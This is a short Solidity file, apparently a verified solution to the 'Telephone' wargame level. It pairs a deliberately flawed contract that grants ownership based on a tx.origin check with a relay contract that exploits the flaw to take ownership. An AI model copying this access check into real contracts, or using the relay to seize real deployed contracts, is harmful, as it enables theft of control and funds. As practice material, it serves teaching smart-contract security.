/**
 *Submitted for verification at Etherscan.io on 2022-04-05
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneChangeOwner{
    Telephone telephone;

    function getTelephoneContract(address addr) public{
        telephone = Telephone(addr);
    }

    function changeTelephoneOwner(address _owner) public{
       telephone.changeOwner(_owner);
    }
}